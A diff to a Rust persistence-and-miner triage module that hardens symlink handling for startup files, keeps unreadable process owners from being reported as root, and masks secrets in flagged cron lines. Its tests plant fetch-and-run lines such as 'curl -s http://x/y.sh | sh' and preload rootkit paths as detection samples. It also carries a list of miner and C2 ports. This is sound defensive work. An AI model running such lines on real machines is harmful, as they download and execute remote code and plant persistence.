@@ -2,34 +2,24 @@
 //! does persist its own JSON report under the state dir). Designed to return in
 //! a few seconds on a box pinned at 100% CPU.
 
-use std::collections::HashMap;
+use std::collections::{HashMap, HashSet};
+use std::os::unix::fs::MetadataExt;
 use std::path::{Path, PathBuf};
 use std::thread::sleep;
 use std::time::Duration;
 
 use anyhow::Result;
+use snsec_common::ai::has_miner_marker;
 use snsec_common::labels::Label;
 use snsec_common::schema::{ProcInfo, TriageSummary};
 
+use crate::evidence_parse;
 use crate::state::State;
 use crate::sys::{netstat, proc};
 use crate::util;
 
 /// Ports strongly associated with mining pools / common C2.
 pub(crate) const BAD_OUT_PORTS: &[u16] = &[3333, 4444, 5555, 7777, 9999, 14444, 45700, 3357];
-
-pub(crate) const MINER_HINTS: &[&str] = &[
-    "stratum",
-    "xmrig",
-    "--donate",
-    "randomx",
-    "cryptonight",
-    "nicehash",
-    "minerd",
-    "nanopool",
-    "supportxmr",
-    "hashvault",
-];
 
 struct Suspect {
     info: ProcInfo,
@@ -71,7 +61,9 @@ pub fn run(state: &State, print: bool) -> Result<TriageSummary> {
         };
         let (exe, deleted) = proc::exe(pid);
         let cwd = proc::cwd(pid);
-        let uidn = proc::uid(pid).unwrap_or(0);
+        // An owner that cannot be read is unknown, never root: it would point the
+        // operator and the model at the wrong account.
+        let user = proc::uid(pid).map_or_else(|| "?".to_string(), proc::username);
         let cmd = proc::cmdline(pid);
         let out_conns = outbound_conns(pid, &by_inode, &listeners);
 
@@ -87,7 +79,7 @@ pub fn run(state: &State, print: bool) -> Result<TriageSummary> {
                 comm: st.comm.clone(),
                 exe,
                 cwd,
-                user: proc::username(uidn),
+                user,
                 cpu_pct: (cpu_pct * 10.0).round() / 10.0,
                 out_conns,
                 deleted_exe: deleted,
@@ -208,8 +200,7 @@ fn score_process(
         }
     }
     // miner hints in cmdline/argv.
-    let joined = cmd.join(" ").to_ascii_lowercase();
-    if MINER_HINTS.iter().any(|h| joined.contains(h)) {
+    if has_miner_marker(&cmd.join(" ")) {
         score += 50;
         miner = true;
     }
@@ -261,26 +252,78 @@ fn decide_label(
 }
 
 fn scan_persistence() -> Vec<String> {
-    scan_persistence_in(Path::new("/etc/ld.so.preload"), &proc::persistence_files())
+    let root = Follow {
+        within: Path::new("/etc"),
+        owner: 0,
+    };
+    scan_persistence_in(
+        Path::new("/etc/ld.so.preload"),
+        &proc::persistence_files(),
+        &root,
+    )
 }
 
 /// What a start-up file that is not read is reported as.
 const UNREAD: &str = "<not read: not a regular file, or too big>";
 
+/// Which start-up file that is a symlink is read through it.
+struct Follow<'a> {
+    /// Only a link here is followed, and only to a file here: root's own `/etc`
+    /// (on RHEL-family systems `/etc/rc.local` is a link to `rc.d/rc.local`).
+    /// Spool crontabs belong to their users and are never read through a link.
+    within: &'a Path,
+    /// Who must own both the link and the file it leads to: root.
+    owner: u32,
+}
+
+/// The text of a start-up file and the file it was read from. A link is read
+/// through only as `follow` allows; a FIFO, a device or a big file never is.
+fn read_startup(path: &Path, follow: &Follow) -> Option<(PathBuf, String)> {
+    let meta = std::fs::symlink_metadata(path).ok()?;
+    if !meta.file_type().is_symlink() {
+        let text = crate::evidence::read_small(path)?;
+        let real = std::fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf());
+        return Some((real, text));
+    }
+    if meta.uid() != follow.owner || !path.starts_with(follow.within) {
+        return None;
+    }
+    let target = std::fs::canonicalize(path).ok()?;
+    if !target.starts_with(std::fs::canonicalize(follow.within).ok()?) {
+        return None;
+    }
+    // Opened without following anything further and checked on the handle.
+    let (text, owner) = crate::evidence::read_small_owned(&target)?;
+    (owner == follow.owner).then_some((target, text))
+}
+
 /// Every entry of the preload file and the suspicious lines of the cron files,
-/// as `path: line`. Files are read through the evidence reader (no symlink, no
-/// FIFO, bounded, invalid UTF-8 kept as U+FFFD), and one that it refuses is a hit
-/// of its own: a stray byte or an odd file type must not hide what is in it.
-fn scan_persistence_in(preload: &Path, files: &[PathBuf]) -> Vec<String> {
+/// as `path: line`. Files are read through the evidence reader (bounded, no
+/// FIFO, invalid UTF-8 kept as U+FFFD, a symlink only as `follow` allows), and
+/// one that it refuses is a hit of its own: a stray byte or an odd file type must
+/// not hide what is in it. A file reached twice is read once. The lines go to
+/// the hub in every report: secrets in them are masked before they are cut.
+fn scan_persistence_in(preload: &Path, files: &[PathBuf], follow: &Follow) -> Vec<String> {
+    let show = |path: &Path, line: &str| {
+        format!(
+            "{}: {}",
+            path.display(),
+            util::ellipsize(&evidence_parse::redact(line.trim()), 100)
+        )
+    };
     let mut hits = Vec::new();
+    let mut seen: HashSet<PathBuf> = HashSet::new();
     if std::fs::symlink_metadata(preload).is_ok() {
-        match crate::evidence::read_small(preload) {
-            Some(c) => hits.extend(
-                c.lines()
-                    .map(str::trim)
-                    .filter(|l| !l.is_empty())
-                    .map(|l| format!("{}: {}", preload.display(), util::ellipsize(l, 100))),
-            ),
+        match read_startup(preload, follow) {
+            Some((real, c)) => {
+                seen.insert(real);
+                hits.extend(
+                    c.lines()
+                        .map(str::trim)
+                        .filter(|l| !l.is_empty())
+                        .map(|l| show(preload, l)),
+                );
+            }
             None => hits.push(format!("{}: {UNREAD}", preload.display())),
         }
     }
@@ -289,21 +332,21 @@ fn scan_persistence_in(preload: &Path, files: &[PathBuf]) -> Vec<String> {
         if path == preload || std::fs::symlink_metadata(path).is_ok_and(|m| m.is_dir()) {
             continue;
         }
-        let Some(content) = crate::evidence::read_small(path) else {
+        let Some((real, content)) = read_startup(path, follow) else {
             if std::fs::symlink_metadata(path).is_ok() {
                 hits.push(format!("{}: {UNREAD}", path.display()));
             }
             continue;
         };
-        for line in content.lines() {
-            if is_suspicious_cron(line) {
-                hits.push(format!(
-                    "{}: {}",
-                    path.display(),
-                    util::ellipsize(line.trim(), 100)
-                ));
-            }
+        if !seen.insert(real) {
+            continue;
         }
+        hits.extend(
+            content
+                .lines()
+                .filter(|l| is_suspicious_cron(l))
+                .map(|l| show(path, l)),
+        );
     }
     hits.truncate(30);
     hits
@@ -439,22 +482,137 @@ mod tests {
             preload.clone(),
             d.join("gone"),
         ];
-        // Returns at all: the FIFO is not waited on.
-        let hits = scan_persistence_in(&preload, &files);
+        let me = nix::unistd::geteuid().as_raw();
         let show = |p: &Path, rest: &str| format!("{}: {rest}", p.display());
+        let hit = show(&tab, "* * * * * curl -s http://x/y.sh | sh");
+        // Where links are not followed (a user's spool), the link is a hit of its
+        // own. Returns at all: the FIFO is not waited on.
+        let user = Follow {
+            within: &d.join("etc"),
+            owner: me,
+        };
         assert_eq!(
-            hits,
+            scan_persistence_in(&preload, &files, &user),
             [
                 show(&preload, "/usr/lib/x/libhide.so"),
                 show(&preload, "/tmp/.k.so"),
-                show(&tab, "* * * * * curl -s http://x/y.sh | sh"),
+                hit.clone(),
                 show(&fifo, UNREAD),
                 show(&link, UNREAD),
                 show(&big, UNREAD),
             ]
         );
+        // Where they are (root's /etc; the test's account plays root), the link
+        // leads to a file already read under its own name: it adds nothing.
+        let root = Follow {
+            within: d,
+            owner: me,
+        };
+        assert_eq!(
+            scan_persistence_in(&preload, &files, &root),
+            [
+                show(&preload, "/usr/lib/x/libhide.so"),
+                show(&preload, "/tmp/.k.so"),
+                hit,
+                show(&fifo, UNREAD),
+                show(&big, UNREAD),
+            ]
+        );
         // No preload file: nothing about it.
-        assert!(scan_persistence_in(&d.join("none"), &[]).is_empty());
+        assert!(scan_persistence_in(&d.join("none"), &[], &root).is_empty());
+    }
+
+    #[test]
+    fn rc_local_is_read_through_roots_link_on_rhel_family_systems() {
+        let dir = tempfile::tempdir().unwrap();
+        let etc = dir.path().join("etc");
+        std::fs::create_dir_all(etc.join("rc.d")).unwrap();
+        let real = etc.join("rc.d/rc.local");
+        std::fs::write(
+            &real,
+            "#!/bin/bash\ntouch /var/lock/subsys/local\n/usr/bin/curl -s http://x/m.sh | sh\n",
+        )
+        .unwrap();
+        let link = etc.join("rc.local");
+        std::os::unix::fs::symlink("rc.d/rc.local", &link).unwrap();
+        // A link of root's that leads out of /etc.
+        let outside = dir.path().join("rc.out");
+        std::fs::write(&outside, "wget http://x/o.sh | sh\n").unwrap();
+        let away = etc.join("away");
+        std::os::unix::fs::symlink(&outside, &away).unwrap();
+
+        let me = nix::unistd::geteuid().as_raw();
+        let root = Follow {
+            within: &etc,
+            owner: me,
+        };
+        let none = etc.join("ld.so.preload");
+        let show = |p: &Path, rest: &str| format!("{}: {rest}", p.display());
+        let line = "/usr/bin/curl -s http://x/m.sh | sh";
+        // Listed as `persistence_files` lists them: the file, then the link.
+        assert_eq!(
+            scan_persistence_in(&none, &[real.clone(), link.clone()], &root),
+            [show(&real, line)]
+        );
+        // The link alone is read through, and named as it was listed.
+        assert_eq!(
+            scan_persistence_in(&none, std::slice::from_ref(&link), &root),
+            [show(&link, line)]
+        );
+        assert_eq!(
+            scan_persistence_in(&none, std::slice::from_ref(&away), &root),
+            [show(&away, UNREAD)]
+        );
+        // A link someone else owns, or one where links are not followed, is not.
+        let other = Follow {
+            within: &etc,
+            owner: me.wrapping_add(1),
+        };
+        assert_eq!(
+            scan_persistence_in(&none, std::slice::from_ref(&link), &other),
+            [show(&link, UNREAD)]
+        );
+        let elsewhere = Follow {
+            within: &dir.path().join("var"),
+            owner: me,
+        };
+        assert_eq!(
+            scan_persistence_in(&none, std::slice::from_ref(&link), &elsewhere),
+            [show(&link, UNREAD)]
+        );
+    }
+
+    #[test]
+    fn a_secret_in_a_flagged_cron_line_does_not_leave_the_box() {
+        let dir = tempfile::tempdir().unwrap();
+        let d = dir.path();
+        let tab = d.join("root");
+        std::fs::write(
+            &tab,
+            "*/5 * * * * wget -q --user=a --password=S3cr3tPw http://x/c.sh -O- | sh\n",
+        )
+        .unwrap();
+        let preload = d.join("ld.so.preload");
+        std::fs::write(&preload, "/usr/lib/x.so token=T0kenVal\n").unwrap();
+        let root = Follow {
+            within: d,
+            owner: nix::unistd::geteuid().as_raw(),
+        };
+        let hits = scan_persistence_in(&preload, std::slice::from_ref(&tab), &root);
+        assert_eq!(hits.len(), 2, "{hits:?}");
+        for h in &hits {
+            assert!(!h.contains("S3cr3tPw") && !h.contains("T0kenVal"), "{h}");
+        }
+        assert!(hits[1].contains("--password=***"), "{}", hits[1]);
+        // The evidence's copy keeps the same text, and hashes as the line would.
+        let line = hits[1].split_once(": ").unwrap().1;
+        assert_eq!(evidence_parse::redact(line), line);
+        assert_eq!(
+            evidence_parse::redacted_line_sha(line),
+            evidence_parse::redacted_line_sha(
+                "*/5 * * * * wget -q --user=a --password=S3cr3tPw http://x/c.sh -O- | sh"
+            )
+        );
     }
 
     #[test]
